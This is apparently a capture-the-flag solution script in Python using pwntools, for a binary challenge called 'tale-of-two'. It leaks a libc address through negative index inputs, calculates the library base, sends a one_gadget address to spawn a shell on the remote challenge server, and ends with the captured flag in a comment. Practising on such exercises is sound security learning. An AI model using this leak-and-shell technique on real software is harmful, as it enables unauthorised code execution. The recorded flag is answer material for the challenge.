#!/usr/bin/env python3

from pwn import *

exe = ELF("./tale-of-two")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    return process(env={"LD_PRELOAD": libc.path})


r = remote("challenges.ctfd.io", 30250)

print()

log.info("leaking address...")
r.recvline()
r.sendline("-5")
LEAK = int(b"0x" + r.recvline(), 16)
log.success("Leak --> %s", hex(LEAK))
log.info("address leaked\n\n")
libc.address = LEAK - libc.sym.printf

r.recvline()
r.sendline("-75")


r.recvline()
r.sendline(str(libc.address + 0x4f322))

r.interactive()

# FLAG --> nactf{a_l0n3ly_dt0r_4nd_a_sh3ll_tUIlF0jxW5aMXoGo}
